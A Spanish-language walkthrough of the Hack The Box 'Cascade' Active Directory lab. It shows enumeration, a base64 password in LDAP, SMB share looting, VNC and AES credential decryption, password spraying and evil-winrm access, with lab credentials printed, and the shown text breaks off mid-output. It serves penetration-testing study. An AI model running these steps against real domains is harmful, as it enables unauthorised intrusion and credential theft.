---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Medium
  - AD
  - PasswordSpraying
  - SMB
  - CredentialDisclosure
  - CredentialDecryption
  - DatabaseEnumeration
  - CodeAnalysis
  - RecycleBinAbuse
  - LDAP
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#System Enumeration|System Enumeration]]
	- [[#Enumeration#Port Enumeration|Port Enumeration]]
	- [[#Enumeration#Active Directory Enumeration|Active Directory Enumeration]]
		- [[#Active Directory Enumeration#Users Validation|Users Validation]]
- [[#Exploitation|Exploitation]]
	- [[#Exploitation#Kerberoasting Attack|Kerberoasting Attack]]
	- [[#Exploitation#Password Spraying|Password Spraying]]
	- [[#Exploitation#Information Disclosure – LDAP Credential Exposure|Information Disclosure – LDAP Credential Exposure]]
- [[#Lateral Movement|Lateral Movement]]
	- [[#Lateral Movement#LDAP Enumeration|LDAP Enumeration]]
	- [[#Lateral Movement#Kerberoasting Attack|Kerberoasting Attack]]
	- [[#Lateral Movement#SMB Enumeration IT|SMB Enumeration IT]]
	- [[#Lateral Movement#VNC Credential Disclosure|VNC Credential Disclosure]]
	- [[#Lateral Movement#Credential Decryption|Credential Decryption]]
	- [[#Lateral Movement#Password Spraying|Password Spraying]]
		- [[#Password Spraying#WinRM|WinRM]]
	- [[#Lateral Movement#SMB Enumeration Audit|SMB Enumeration Audit]]
	- [[#Lateral Movement#DB Enumeration|DB Enumeration]]
	- [[#Lateral Movement#Code Analysis|Code Analysis]]
	- [[#Lateral Movement#Credential Decryption|Credential Decryption]]
		- [[#Credential Decryption#User Validation|User Validation]]
- [[#Privilege Escalation|Privilege Escalation]]
	- [[#Privilege Escalation#Active Directory Recycle Bin Abuse|Active Directory Recycle Bin Abuse]]

---
# Cascade

![](Screenshots/Pasted%20image%2020260603171648.png)

>Máquina de Hack The Box llamada **[Cascade](https://app.hackthebox.com/machines/Cascade)**, centrada en la explotación de un entorno **Active Directory** mediante múltiples fallos de exposición de información y reutilización de credenciales.
>La intrusión comienza con la enumeración de servicios de dominio accesibles de forma anónima, permitiendo obtener usuarios válidos y descubrir una contraseña almacenada en un atributo LDAP. A partir de esta información se accede a recursos compartidos SMB donde se recuperan nuevas credenciales expuestas en configuraciones y aplicaciones internas.
>Posteriormente, mediante el análisis de una aplicación de auditoría desarrollada internamente, se identifican claves criptográficas utilizadas para proteger contraseñas almacenadas, permitiendo comprometer cuentas con mayores privilegios.
>Finalmente, aprovechando permisos asociados al grupo **Active Directory Recycle Bin**, se recuperan objetos eliminados del dominio que contienen credenciales históricas reutilizadas, obteniendo acceso como **Administrator** y comprometiendo completamente el controlador de dominio.

---
## Enumeration
### System Enumeration

```PowerShell
ping -c 1 10.129.10.53
PING 10.129.10.53 (10.129.10.53) 56(84) bytes of data.
64 bytes from 10.129.10.53: icmp_seq=1 ttl=127 time=32.9 ms

--- 10.129.10.53 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 32.853/32.853/32.853/0.000 ms
```

El `TTL=127` indica que probablemente estamos ante un sistema Windows.
### Port Enumeration

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.10.53 -oG allPorts
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49167/tcp open  unknown          syn-ack ttl 127
```

```PowerShell
nmap -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49167 -sCV 10.129.10.53 -oN targeted
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
|_clock-skew: -2s
| smb2-time: 
|   date: 2026-06-03T15:22:12
|_  start_date: 2026-06-03T15:13:25
```

```PowerShell
crackmapexec smb 10.129.10.53
SMB         10.129.10.53    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
```

Se añade al archivo `/etc/hosts` el dominio: `10.129.10.53 cascade.local CASC-DC1.cascade.local`.
### Active Directory Enumeration

Se enumera los archivos compartidos.

```PowerShell
crackmapexec smb 10.129.10.53 --shares
SMB         10.129.10.53    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.10.53    445    CASC-DC1         [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

smbmap -H 10.129.10.53
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[!] Access denied on 10.129.10.53, no fun for you...                                                                         
[*] Closed 1 connections

smbmap -H 10.129.10.53 -u " "
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[!] Access denied on 10.129.10.53, no fun for you...                                                                     
[*] Closed 1 connections 

smbclient -L 10.129.10.53 -N
        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.10.53 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

No se consigue enumerar nada, se prueba con usuarios y dominios.

```PowerShell
rpcclient -U "" -N 10.129.10.53
rpcclient $> querydominfo
Domain:         CASCADE
Server:
Comment:
Total Users:    56
Total Groups:   0
Total Aliases:  11
Sequence No:    1
Force Logoff:   18446744073709551615
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[DnsUpdateProxy] rid:[0x44f]

rpcclient $> querydispinfo
index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull     Name: Adrian Turnbull   Desc: (null)
index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc    Desc: (null)
index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson       Name: Ben Hanson        Desc: (null)
index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc      Name: BackupSvc Desc: (null)
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest      Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman       Name: David Burman      Desc: (null)
index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe        Name: Edward Crowe      Desc: (null)
index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft        Name: Ian Croft Desc: (null)
index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen        Name: Joseph Allen      Desc: (null)
index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand     Name: John Goodhand     Desc: (null)
index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield    Name: James Wakefield   Desc: (null)
index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson     Name: Ryan Thompson     Desc: (null)
index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson      Name: Stephanie Hickson Desc: (null)
index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith        Name: Steve Smith       Desc: (null)
index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util   Name: Util      Desc: (null)

rpcclient $> querygroupmem 0x200
result was NT_STATUS_ACCESS_DENIED

rpcclient $> enumprinters
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
```

Se procesan los resultados para obtener listas limpias:

```PowerShell
cat users | awk -F'[][]' '{print $2}' | sponge users
cat groups | awk -F'[][]' '{print $2}' | sponge groups
```

Se comprueban los usuarios son válidos.
#### Users Validation

```PowerShell
kerbrute userenum --dc 10.129.10.53 -d cascade.local users
2026/06/03 17:46:12 >  [+] VALID USERNAME:       arksvc@cascade.local
2026/06/03 17:46:12 >  [+] VALID USERNAME:       util@cascade.local
2026/06/03 17:46:12 >  [+] VALID USERNAME:       s.hickson@cascade.local
2026/06/03 17:46:12 >  [+] VALID USERNAME:       r.thompson@cascade.local
2026/06/03 17:46:12 >  [+] VALID USERNAME:       s.smith@cascade.local
2026/06/03 17:46:12 >  [+] VALID USERNAME:       a.turnbull@cascade.local
2026/06/03 17:46:12 >  [+] VALID USERNAME:       j.wakefield@cascade.local
2026/06/03 17:46:12 >  [+] VALID USERNAME:       j.goodhand@cascade.local
2026/06/03 17:46:17 >  [+] VALID USERNAME:       BackupSvc@cascade.local
2026/06/03 17:46:17 >  [+] VALID USERNAME:       d.burman@cascade.local
2026/06/03 17:46:17 >  [+] VALID USERNAME:       j.allen@cascade.local
2026/06/03 17:46:17 >  Done! Tested 15 usernames (11 valid) in 10.179 seconds
```

---
## Exploitation
### Kerberoasting Attack

Al tener un listado de usuario se prueba un **Kerberoasting Attack**.

```PowerShell
impacket-GetUserSPNs cascade.local/ -usersfile users -no-pass
[-] CCache file is not found. Skipping...
[-] invalid principal syntax
```

No es posible.
### Password Spraying

Se realiza un ataque de fuerza bruta para ver si averiguamos alguna contraseña.

```PowerShell
crackmapexec smb 10.129.10.53 -u users -p users
SMB         10.129.10.53    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.10.53    445    CASC-DC1         [-] cascade.local\CascGuest:CascGuest STATUS_LOGON_FAILURE 
SMB         10.129.10.53    445    CASC-DC1         [-] cascade.local\CascGuest:arksvc STATUS_LOGON_FAILURE 
SMB         10.129.10.53    445    CASC-DC1         [-] cascade.local\CascGuest:s.smith STATUS_LOGON_FAILURE 
...
```

Pero no se encuentra nada.
### Information Disclosure – LDAP Credential Exposure

Se enumerar el protocolo `LDAP`.

```PowerShell
# Se obtiene mucha información, pongo lo importante
ldapsearch -x -H ldap://10.129.10.53 -b "DC=cascade,DC=local"
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

Se encuentra el parámetro `cascadeLegacyPwd: clk0bjVldmE=`.

```PowerShell
echo 'clk0bjVldmE=' | base64 -d
rY4n5eva
```

Se comprueban credenciales.

```PowerShell
crackmapexec smb 10.129.10.53 -u 'r.thompson' -p 'rY4n5eva'
SMB         10.129.10.53   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.10.53   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva

# Al no estar en el grupo Remote Management Users, no podemos conectarnos
crackmapexec winrm 10.129.10.53 -u 'r.thompson' -p 'rY4n5eva'
SMB         10.129.10.53   5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.129.10.53   5985   CASC-DC1         [*] http://10.129.10.53:5985/wsman
WINRM       10.129.10.53   5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva
```

---
## Lateral Movement
### LDAP Enumeration

Se realiza una enumeración de forma manual.

```PowerShell
mkdir ldapdomaindump
cd ldapdomaindump
ldapdomaindump -u 'cascade.local\r.thompson' -p 'rY4n5eva' 10.129.10.53
python3 -m http.server 80
```

![](Screenshots/Pasted%20image%2020260604174523.png)

El usuario `Ryan Thompson`, se encuentra en el grupo `IT`, además de `Steve Smith` y `ArkSvc`. `Steve Smith` se encuentra en el grupo `Audit Share` y `Remote Management Users`.

El usuario `ArkSvc` pertenece al grupo `AD Recycle Bin`, que posee permisos para consultar objetos eliminados almacenados en Active Directory.  
  
Estos objetos conservan atributos históricos que normalmente no son visibles para usuarios estándar. En este caso, la cuenta eliminada `TempAdmin` contenía el atributo `cascadeLegacyPwd`, permitiendo recuperar una contraseña reutilizada posteriormente por el usuario `Administrator`.
### Kerberoasting Attack

```PowerShell
impacket-GetUserSPNs cascade.local/r.thompson:rY4n5eva
No entries found!
```
### SMB Enumeration IT

```PowerShell
crackmapexec smb 10.129.10.53 -u 'r.thompson' -p 'rY4n5eva' --shares
SMB         10.129.10.53   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.10.53   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.10.53   445    CASC-DC1         [+] Enumerated shares
SMB         10.129.10.53   445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.10.53   445    CASC-DC1         -----           -----------     ------
SMB         10.129.10.53   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.10.53   445    CASC-DC1         Audit$                          
SMB         10.129.10.53   445    CASC-DC1         C$                              Default share
SMB         10.129.10.53   445    CASC-DC1         Data            READ            
SMB         10.129.10.53   445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.10.53   445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.10.53   445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.10.53   445    CASC-DC1         SYSVOL          READ            Logon server share
```

```PowerShell
mkdir Data
cd Data
smbclient //10.129.96.155/Data -U 'r.thompson'
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

tree IT
IT
├── Email Archives
│   └── Meeting_Notes_June_2018.html
├── LogonAudit
├── Logs
│   ├── Ark AD Recycle Bin
│   │   └── ArkAdRecycleBin.log
│   └── DCs
│       └── dcdiag.log
└── Temp
    ├── r.thompson
    └── s.smith
        └── VNC Install.reg
```

Se visualiza el archivo `Meeting_Notes_June_2018.html`.

![](Screenshots/Pasted%20image%2020260604181923.png)

El usuario `TempAdmin` tiene la misma contraseña que el usuario `Administrator`, esté usuario lo podríamos recuperar con el grupo `AD Recycle Bin`.

### VNC Credential Disclosure

Se visualiza el `VNC Install.reg`.

```PowerShell
cat VNC\ Install.reg
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

Se encuentra el parámetro `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`.
### Credential Decryption

[VNCDecrypt](https://github.com/billchaison/VNCDecrypt).

```PowerShell
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

Se obtiene la contraseña `sT333ve2`.
### Password Spraying

```PowerShell
crackmapexec smb 10.129.10.53 -u users -p 'sT333ve2' --continue-on-success
SMB         10.129.10.53   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\CascGuest:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\r.thompson:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\util:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\j.wakefield:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\s.hickson:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\j.goodhand:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\a.turnbull:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\e.crowe:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\b.hanson:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\d.burman:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\BackupSvc:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\j.allen:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.10.53   445    CASC-DC1         [-] cascade.local\i.croft:sT333ve2 STATUS_LOGON_FAILURE
```

Se obtiene las credenciales `s.smith:sT333ve2`, se encuentra en el grupo `Remote Management Group` y `Audit Share`, como hemos visto anteriormente.

```PowerShell
crackmapexec winrm 10.129.10.53 -u 's.smith' -p 'sT333ve2'
SMB         10.129.10.53   5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.129.10.53   5985   CASC-DC1         [*] http://10.129.10.53:5985/wsman
WINRM       10.129.10.53   5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
```
#### WinRM

```PowerShell
evil-winrm -i 10.129.10.53 -u 's.smith' -p 'sT333ve2'
```

La flag de `usuario` se encuentra en: `C:\Users\s.smith\Desktop`.
### SMB Enumeration Audit

```PowerShell
crackmapexec smb 10.129.10.53 -u 's.smith' -p 'sT333ve2' --shares
SMB         10.129.10.53   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.10.53   445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.129.10.53   445    CASC-DC1         [+] Enumerated shares
SMB         10.129.10.53   445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.10.53   445    CASC-DC1         -----           -----------     ------
SMB         10.129.10.53   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.10.53   445    CASC-DC1         Audit$          READ            
SMB         10.129.10.53   445    CASC-DC1         C$                              Default share
SMB         10.129.10.53   445    CASC-DC1         Data            READ            
SMB         10.129.10.53   445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.10.53   445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.10.53   445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.10.53   445    CASC-DC1         SYSVOL          READ            Logon server share 
```

```PowerShell
mkdir Audit
cd Audit
smbclient //10.129.10.53/Audit$ -U 's.smith'
smb: \> prompt OFF
smb: \> mget *

tree Audit
Audit
├── CascAudit.exe
├── CascCrypto.dll
├── DB
│   └── Audit.db
├── RunAudit.bat
├── System.Data.SQLite.dll
├── System.Data.SQLite.EF6.dll
├── x64
│   └── SQLite.Interop.dll
└── x86
    └── SQLite.Interop.dll
```
### DB Enumeration

Se observa el archivo `Audit.db`.

```PowerShell
file Audit.db
Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60

# Es un archivo SQLite 3.x
sqlite3 Audit.db
sqlite> .tables
DeletedUserAudit  Ldap              Misc
# Lo unico interesante
sqlite> SELECT * FROM Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

Se encuentra la credenciales `ArkSvc:BQO5l5Kj9MdErXx6Q6AGOw==`, ahora tenemos que saber como se ha encriptado ...
### Code Analysis

Para poder visualizar los archivos, se necesita instalar un descompilador siendo [dotPeek](https://www.jetbrains.com/es-es/decompiler/).

Del archivo `CascAudit.exe`, sacamos la siguiente información:

![](Screenshots/Pasted%20image%2020260604192659.png)

Del archivo `CascCrypto.dll`, sacamos la siguiente información:

![](Screenshots/Pasted%20image%2020260604194634.png)

Ya tenemos la siguiente información:
- **Mode:** `AES CBC`
- **Key:** `c4scadek3y654321`
- **IV:** `1tdyjCbY1Ix49842`
- **Password:** `BQO5l5Kj9MdErXx6Q6AGOw==`
### Credential Decryption

A partir del análisis de `CascAudit.exe` y `CascCrypto.dll`, se identifican todos los parámetros necesarios para reproducir el proceso de cifrado utilizado por la aplicación.  
  
Con la clave AES, el IV y el modo de operación recuperados, es posible descifrar la contraseña almacenada en la base de datos SQLite y obtener las credenciales del usuario `ArkSvc`.

Se usa [CyberChef](https://gchq.github.io/CyberChef/) para desencriptar.

![](Screenshots/Pasted%20image%2020260604195134.png)

Se obtiene las credenciales: `ArkSvc:W3lc0meFr31nd`.
#### User Validation

```PowerShell
crackmapexec smb 10.129.10.53 -u 'arksvc' -p 'w3lc0meFr31nd'
SMB         10.129.10.53   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.10.53   445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd

crackmapexec winrm 10.129.10.53 -u 'arksvc' -p 'w3lc0meFr31nd'
SMB         10.129.10.53   5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.129.10.53   5985   CASC-DC1         [*] http://10.129.10.53:5985/wsman
WINRM       10.129.10.53   5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
```

```PowerShell
evil-winrm -i 10.129.10.53 -u 'arksvc' -p 'w3lc0meFr31nd'
```

---
## Privilege Escalation
### Active Directory Recycle Bin Abuse

```PowerShell
get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects

Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059

get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
CN                              : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
codePage                        : 0
countryCode                     : 0
Created                         : 1/9/2020 7:30:19 PM
createTimeStamp                 : 1/9/2020 7:30:19 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM}
instanceType                    : 4
isCriticalSystemObject          : False
isDeleted                       : True
LastKnownParent                 : OU=Computers,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
localPolicyFlags                : 0
logonCount                      : 0
Modified                        : 1/28/2020 6:08:35 PM
modifyTimeStamp                 : 1/28/2020 6:08:35 PM
msDS-LastKnownRDN               : CASC-WS1
Name                            : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : computer
ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108
primaryGroupID                  : 515
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132230718192147073
sAMAccountName                  : CASC-WS1$
sDRightsEffective               : 0
userAccountControl              : 4128
uSNChanged                      : 245849
uSNCreated                      : 24603
whenChanged                     : 1/28/2020 6:08:35 PM
whenCreated                     : 1/9/2020 7:30:19 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
